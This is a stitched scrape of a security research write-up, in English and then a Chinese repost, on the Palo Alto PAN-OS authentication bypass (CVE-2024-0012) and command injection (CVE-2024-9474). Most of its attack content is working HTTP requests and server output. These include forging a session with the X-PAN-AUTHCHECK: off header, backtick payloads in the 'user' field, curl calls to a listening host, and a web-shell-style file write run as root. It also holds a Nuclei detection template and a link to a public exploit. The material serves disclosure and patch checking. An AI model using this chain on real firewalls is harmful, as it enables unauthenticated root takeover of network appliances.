+Set-Cookie: PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Cache-Control: no-cache; no-store
+
+@start@PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6@end@
+A quick look at the file system shows our payload is sitting tight within the session’s contents, and as expected, in the 'userName' key (i.e. $_SESSION['userName']):
+
+[root@PA-VM /]# cat ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6
+cmsRemoteSession|s:1:"1";panorama_sessionid|s:5:"dummy";user|s:16:"XXXX";userName|s:52:"`curl {{listening-host}}`";userRole|s:9:"superuser"
+We’d like to be honest here and give the complete trace down of where this vulnerability actually is, source-to-sink but, well, sometimes you just need to use a sledgehammer instead of tweezers.
+
+With our payload injected into the correct location, we set out to blast all endpoints with our shiny PHPSESSID . As the code affected by the command injection was in audit log writing code, we just took a punt and fired our request - with our newly minted and forged PHP session at index.php.
+
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2jq4l1nv43idudknmhj830vdde;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+The command under the hood looks a little like this (thanks pspy!):
+
+CMD: UID=0     PID=87502  | sh -c export panusername="`curl {{listening-host}}`";export superuser="1";export isxml="yes";/usr/local/bin/sdb -e -n ha.app.local.state
+Please pause. It's 2024. We've made our point, so we'll say nothing more.
+
+The full chain looks something like this:
+
+POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+
+user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+GET /unauth/watchTowr.php HTTP/1.1
+Host: 192.168.1.227
+Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+
+This results in our injected command being executed:
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:39:17 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 108
+Connection: keep-alive
+Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+
+Linux PA-VM 4.18.0-240.1.1.20.pan.x86_64 #1 SMP Wed Jul 31 20:37:12 PDT 2024 x86_64 x86_64 x86_64 GNU/Linux
+
+Summary
+So, yet another super-duper secure next-generation hardened security appliance popped.
+
+This time it’s due to those pesky backticks, combined with the super-complicated step of simply asking the server not to check our authentication via X-PAN-AUTHCHECK.
+
+
+It’s amazing that these two vulnerabilities got into a production appliance, amazingly allowed via the hacked-together mass of shell script invocations that lurk under the hood of a Palo Alto appliance.
+
+Usual readers might be expecting a nice PoC, and while we’d love to provide one, we’re holding off on this one for a week or so to allow administrators time to patch - but instead, we’re releasing a Nuclei template that you can use to check if your hosts are affected here.
+
+The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.
+
+By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: time to respond.
+
+Gain early access to our research, and understand your exposure, with the watchTowr Platform
+REQUEST A DEMO
+Previous post
+Hop-Skip-FortiJump-FortiJump-Higher - Fortinet FortiManager CVE-2024-47575
+Next post
+Where There’s Smoke, There’s Fire - Mitel MiCollab CVE-2024-35286, CVE-2024-41713 And An 0day
+watchTowr Labs © 2025
+watchTowr
+Powered by Ghost
+
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+限时体验
+热
+新
+freeBuf
+主站
+
+
+公开课
+商城
+用户服务 
+行业服务 
+知识大陆
+搜索关键词...
+
+
+Palo 防火墙0day漏洞 CVE-2024-0012 和 CVE-2024-9474 检测POC&EXP
+
+转载情报员
+关注
+Web安全
+终端安全
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+0
+
+1
+
+2
+
+3
+
+4
+
+5
+
+6
+
+7
+
+8
+
+9
+
+Palo 防火墙0day漏洞 CVE-2024-0012 和 CVE-2024-9474 检测POC&EXP
+转载情报员
+2024-11-21 11:05:32
+430652
+ 所属地 上海
+
+本文来源
+公众号
+李白你好
+，如有疑问请联系FreeBuf客服（微信号：freebee1024）
+CVE-2024-0012
+第 1 阶段 - 身份验证绕过 - CVE-2024-0012
+
+
+
+查看主要的 Nginx 路由配置 -/etc/nginx/conf/locations.conf发现了相当有限（但影响很大）的变化：
+
+add_header Allow "GET, HEAD, POST, PUT, DELETE, OPTIONS";
+ if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) {
+   return 405;
+ }
+
++proxy_set_header X-Real-IP "";
++proxy_set_header X-Real-Scheme "";
++proxy_set_header X-Real-Port "";
++proxy_set_header X-Real-Server-IP "";
++proxy_set_header X-Forwarded-For  "";
++proxy_set_header X-pan-ndpp-mode "";
++proxy_set_header Proxy "";
++proxy_set_header X-pan-AuthCheck 'on';
+
+
+ # rewrite_log on;
+
+ # static ones
+@@ -27,6 +17,5 @@ location /nginx_status {
+ location ~ \.js\.map$ {
+   add_header Cache-Control "no-cache; no-store";
+   proxy_pass_header Authorization;
++  include conf/proxy_default.conf;
+   proxy_pass http://$gohost$gohostExt;
+ }
+虽然看起来不多，但这里足以推断出 CVE-2024-0012 的入口点。这告诉我们什么？嗯，两件至关重要的事。首先，我们可以看到，在任何路由或处理的定义之前，已经设置了一堆请求标头，而事实并非如此 - 最重要的是，在定义任何路由处理之前，这个X-pan-AuthCheck控制身份验证的值现在被on默认设置为。
+
+其次，我们可以看到conf/proxy_default.conf（其中还设置了默认标头，包括 X-pan-AuthCheck）已被添加到.js.mapURI 处理程序中 - 而之前这是稍后设置的。
+
+经过一些快速推断，看起来在以前未修补的版本中，Nginx 之前没有在此指令内正确设置身份验证标头 - 这是否允许我们滥用 proxypass 声明来发送没有配置 HTTP 请求标头 X-pan-Authcheck 的请求到所谓的“受保护”的端点？
+
+利用我们对 Nginx proxypass 滥用案例的了解，我们思考了每个人都信任的保护其通信和内部网络安全的企业级安全设备的现状，并测试了各种变体，看看是否有任何一种可以让我们通过，例如：
+
+/php/ztp_gate.php%3f.js.map
+/php/ztp_gate.php?.js.map
+/php/ztp_gate.php#.js.map
+/php/ztp_gate.php/.js.map
+这些都不起作用：
+
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: 18.142.51.124
+
+HTTP/1.1 302 Found
+Date: Tue, 19 Nov 2024 10:04:27 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+Set-Cookie: PHPSESSID=bu82e0mthttbaqbp6djh0lgpd9; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /php/login.php?
+Cache-Control: no-cache; no-store
+我们有点闷闷不乐，直到头顶上出现了一道明亮的光。
+脚本uiEnvSetup.php要求HTTP_X_PAN_AUTHCHECK将值设置为off，这是之前被 Nginx 阻止的。也许我们可以直接提供它？
+稍微开明一点——我们再次尝试：
+
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 10:05:08 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 4635
+Connection: keep-alive
+Set-Cookie: PHPSESSID=m1sea0p2n2p89kncqked9sd2p1; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: default-src 'self'; connect-src 'self' data.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com; script-src 'self' 'unsafe-eval' 'unsafe-inline' app.pendo.io pendo-io-static.storage.googleapis.com cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; style-src 'self' 'unsafe-inline' app.pendo.io cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com; img-src 'self' data: cdn.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; frame-ancestors 'self' app.pendo.io; child-src 'self' app.pendo.io; form-action 'self' 'unsafe-eval' 'unsafe-inline'
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache; no-store
+
+<html>
+
+<head>
+    <title>Zero Touch Provisioning</title>
+我们只需……将off值提供给X-PAN-AUTHCHECKHTTP 请求标头，服务器就会自动关闭身份验证？！此时，为什么有人感到惊讶？
+没错，各位，这是一个CVE-2024-0012 的简单复现器。再简单不过了。
+进入第二阶段，privesc 漏洞！
+
+CVE-2024-9474
+现在闸门已经打开，各种后认证 PHP 功能都已触手可及。通常从现在开始，下一步 RCE 就取决于我们的创造力了。
+让我们通过继续差异分析来看看威胁行为者发现了什么。
+
+一个令我们非常关注的文件是 中的更改/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php，它揭示了一个非常诚实的命令注入：
+
+<?php
+
+namespace panui_core\log;
+
+use pan_core\InjectableClass;
+use pan_process\Process;
+use pan_process\ShellSanitizer;
+
+class AuditLog extends InjectableClass
+{
+  public function write($username, $message) {
+    /** @var ShellSanitizer */
+    $s = $this->ioc->get(ShellSanitizer::class);
+    $msg = $s->escapeshellarg($message);
+
+    /** @var Process */
+    $p = $this->ioc->get(Process::class);
+-    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
++    $u = $s->escapeshellarg($username);
++    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $u");
+  }
+}
+没有比这更直接的了。
+不知何故，用户能够将包含 shell 元字符的用户名传递给AuditLog.write()函数，然后将其值传递给pexecute()。
+查看其他更改时，我们发现一个更改相当大的文件 - /var/appweb/htdocs/php/utils/createRemoteAppwebSession.php。
+
+<?php
+
+WebSession::start();
+
+/** @noinspection PhpUndefinedFunctionInspection */
+$isCms = panui_platform_is_cms();
+if ($isCms == 0) {
+    // create a remote appweb session only on a device
+    // 'vsys' is the list of accessible vsys for the user. If blank then it means all vsys
+
+    $locale = isset($_POST['locale']) ? $_POST['locale'] : $_SESSION['locale'];
++    $user = $_POST['user'];
++    $userRole = $_POST['userRole'];
++    $remoteHost = $_POST['remoteHost'];
++    $vsys = $_POST['vsys'];
++    $editShared = $_POST['editShared'];
++    $protocol = $_POST['prot'];
++    $serverPort = $_SERVER['SERVER_PORT'];
++    $rbaXml = $_POST['rbaxml'];
++    $hideHeaderBg = $_POST['hideHeaderBg'];
++    if (strlen($user) <= 63
++        && strlen ($userRole) < 256
++        && strlen ($remoteHost) < 256
++        && strlen ($vsys) < 128
++        && strlen ($editShared) < 128
++        && strlen ($protocol) < 128
++        && strlen ($serverPort) < 128
++        && strlen ($rbaXml) < 1024 * 1024
++        && strlen ($locale) < 256
++        && strlen ($hideHeaderBg) < 128
++    ) {
+        /** @noinspection PhpUndefinedFunctionInspection */
+        panCreateRemoteAppwebSession(
+-            $_POST['user'],
++            $user,
+-            $_POST['userRole'],
++            $userRole,
+-            $_POST['remoteHost'],
++            $remoteHost,
+-            $_POST['vsys'],
++            $vsys,
+-            $_POST['editShared'],
++            $editShared,
+-            $_POST['prot'],
++            $protocol,
+-            $_SERVER['SERVER_PORT'],
++            $serverPort,
+-            $_POST['rbaxml'],
++            $rbaXml,
+            $locale,
+-            $_POST['hideHeaderBg'],
++            $hideHeaderBg
+        );
++    } else {
++        error_log("An invalid attempt was made with mismatched lengths while attempting to create a remote appweb session");
++    }
+}
+
+session_write_close();
+在我们进一步讨论之前，我们对此功能的理解有点疯狂。
+我们的理解是，此功能可让 Palo Alto Panorama 用户有效地“跳入”连接的 SSLVPN/防火墙设备 - 如上所示，无需实际身份验证（即有效密码）。此功能允许 Palo Alto Panorma 设备指定他们想要模拟的用户、用户角色等 - 并以非常友好的方式提供完全经过身份验证、无需 2FA 的有效 PHP 会话 ID。
+初看之下，很明显该功能似乎是根据收到的 HTTP 请求中传递的 POST 参数值创建一个 PHP 会话（针对看似任意的用户和看似任意的角色）。
+一瞬间，我们被引入的长度检查吓了一跳——这会不会成为某种不寻常的内存损坏漏洞？然后我们笑了，因为从来没有任何看起来像是复杂的东西需要用到设备中。
+我们的理论很简单 - 通过“用户”参数传递的值可能会进入$_SESSION ['userName']，正如我们上面看到的，它看起来像是命令注入漏洞补丁的来源。
+不用担心 - 我们决定继续并创建一个有效的 HTTP 请求，使用我们前面提到的身份验证绕过，以及“用户”键的 HTTP post 参数值，其中包含curl对我们的外部监听主机的简单命令：
+
+POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+
+user=`curl {{listening-host}}`&userRole=superuser&remoteHost=&vsys=vsys1
+这将返回一个很好的 PHP 会话 ID 值：
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:06:44 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 48
+Connection: keep-alive
+Set-Cookie: PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Cache-Control: no-cache; no-store
+
+@start@PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6@end@
+快速查看文件系统表明我们的有效载荷紧密位于会话内容中，并且如预期的那样，位于“userName”键中（即 $_SESSION['userName']）：
+
+[root@PA-VM /]# cat ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6
+cmsRemoteSession|s:1:"1";panorama_sessionid|s:5:"dummy";user|s:16:"XXXX";userName|s:52:"`curl {{listening-host}}`";userRole|s:9:"superuser"
+在这里，我们希望诚实地给出这个漏洞的真正位置，从源头到终端，的完整追踪，但是，有时候，你只需要用大锤而不是镊子。将有效载荷注入到正确的位置后，我们开始用闪亮的攻击所有端点PHPSESSID。由于受命令注入影响的代码位于审计日志编写代码中，我们只是冒险并发出了请求 - 使用我们在 index.php 上新创建和伪造的 PHP 会话。
+
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2jq4l1nv43idudknmhj830vdde;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+底层的命令看起来有点像这样（感谢pspy！）：
+
+CMD: UID=0     PID=87502  | sh -c export panusername="`curl {{listening-host}}`";export superuser="1";export isxml="yes";/usr/local/bin/sdb -e -n ha.app.local.state
+请暂停一下。现在是 2024 年。我们已经表明了我们的观点，所以我们不再多说了。
+完整的链条看起来是这样的：
+
+POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+
+user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+
+GET /unauth/watchTowr.php HTTP/1.1
+Host: 192.168.1.227
+Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+这会导致我们注入的命令被执行：
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:39:17 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 108
+Connection: keep-alive
+Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+
+Linux PA-VM 4.18.0-240.1.1.20.pan.x86_64 #1 SMP Wed Jul 31 20:37:12 PDT 2024 x86_64 x86_64 x86_64 GNU/Linu
+参考链接：
+
+https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/
+
+Nuclei-POC
+于是，又一种超级安全的下一代强化安全设备诞生了。
+这次是由于那些讨厌的反引号，再加上要求服务器不要通过检查我们的身份验证的超级复杂步骤X-PAN-AUTHCHECK。
+
+
+
+令人惊奇的是，这两个漏洞竟然存在于生产设备中，而且是通过隐藏在 Palo Alto 设备内部的大量 Shell 脚本调用实现的。
+老读者可能会期待一个不错的 PoC，虽然我们很乐意提供一个，但我们会推迟一周左右发布，以让管理员有时间进行修补 - 但相反，我们发布了一个 Nuclei 模板，您可以使用它来检查您的主机是否受到影响。
+
+CVE-2024-0012-POC
+id: palo-alto-vpn-CVE-2024-0012-check-wt
+
+info:
+  name: Palo Alto PAN-OS Authentication Bypass in the Management Web Interface CVE-2024-0012
+  author: watchTowr
+  severity: critical
+  description: An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like CVE-2024-9474.
+  tags: palo-alto
+  metadata:
+    max-request: 4
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/php/utils/CmsGetDeviceSoftwareVersion.php/.js.map"
+
+    headers:
+      X-PAN-AUTHCHECK: off
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: or
+        words:
+          - "0.0.0"
+
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "Expires: 0"
+          - "PHPSESSID="
+          - "application/json"
+CVE-2024-9474-POC
+PAN-OS auth bypass + RCE
+
+
+
+https://github.com/Chocapikk/CVE-2024-9474
+# 渗透测试# web安全# 数据安全
+免责声明
+1.一般免责声明：本文所提供的技术信息仅供参考，不构成任何专业建议。读者应根据自身情况谨慎使用且应遵守《中华人民共和国网络安全法》，作者及发布平台不对因使用本文信息而导致的任何直接或间接责任或损失负责。
+2. 适用性声明：文中技术内容可能不适用于所有情况或系统，在实际应用前请充分测试和评估。若因使用不当造成的任何问题，相关方不承担责任。
+3. 更新声明：技术发展迅速，文章内容可能存在滞后性。读者需自行判断信息的时效性，因依据过时内容产生的后果，作者及发布平台不承担责任。
+本文为 转载情报员 独立观点，未经授权禁止转载。
+如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf 客服小蜜蜂（微信：freebee1024）
+被以下专辑收录，发现更多精彩内容
++ 收入我的专辑
++ 加入我的收藏
+相关推荐
+深入了解失效对象级授权（BOLA）：API安全的薄弱环节
+付费
+
+
+深入了解失效对象级授权（BOLA）：API安全的薄弱环节基础安全
+引言在当今数字化迅猛发展的时代，应用程序接口（API）作为不同软件系统之间的桥梁，正日益成为企业技术架构的核心组成部分。随着API的广泛使用...
+
+AlbertJay
+
+330321
+围观
+ · 
+2
+收藏
+2024-11-24
+
+Weblogic CVE-2022-21350 RCE漏洞分析
+原创
+Weblogic CVE-2022-21350 RCE漏洞分析漏洞
+Weblogic CVE-2022-21350 RCE漏洞深入分析，以及POC编写分析
+
+锐捷天幕安全实验室
+
+174662
+围观
+ · 
+5
+收藏
+2024-11-24
+
+Scrapling：一款轻量级自适应Web爬虫工具
+Scrapling：一款轻量级自适应Web爬虫工具工具
+Scrapling 是一款高性能、智能的 Python 网页抓取库，可自动适应网站变化，同时性能远超其他热门工具。
+
+Alpha_h4ck
+
+163089
+围观
+ · 
+6
+收藏
+ · 
+4
+喜欢
+2024-11-22
+
+OpenResty的CVE-2024-39702原理分析
+OpenResty的CVE-2024-39702原理分析漏洞
+本文将帮助你了解这个漏洞，并介绍一些有效的防范措施。
+
+Y11
+
+235233
+围观
+ · 
+1
+收藏
+ · 
+1
+喜欢
+2024-11-22
+
+如何对AI系统做攻防演练风险评估：Red Teaming手册
+如何对AI系统做攻防演练风险评估：Red Teaming手册Web安全
+简单来说，Red Teaming是一种有结构地利用人类或AI来探索新系统潜在风险的方法。
+
+Y11
+
+65974
+围观
+2024-11-22
+
+
+转载情报员
+LV.1
+这家伙太懒了，还未填写个人描述！
+
+86
+文章数
+20
+关注者
+0成本投毒之后，我污染了全网AI替我说谎
+2025-11-03
+机器人出现“人传人”漏洞？宇树还能打好安全这张牌吗？
+2025-10-09
+一图读懂｜国家网络安全事件报告管理办法
+2025-09-15
+文章目录
+CVE-2024-0012
+CVE-2024-9474
+Nuclei-POC
+CVE-2024-0012-POC
+CVE-2024-9474-POC
+
+本站由阿里云 提供计算与安全服务
+
+用户服务
+有奖投稿
+提交漏洞
+参与众测
+商城
+企业服务
+安全咨询
+产业全景图
+企业SRC
+安全众测
+合作信息
+斗象官网
+广告投放
+联系我们
+关于我们
+关于我们
+微信公众号
+新浪微博
+战略伙伴
+
+FreeBuf知识大陆
+
+扫码把安全装进口袋
+
+斗象科技
+FreeBuf
+漏洞盒子
+斗象智能安全
+免责条款
+协议条款
+Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
+   沪ICP备2024099014号
+|
+沪公安网备 
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+
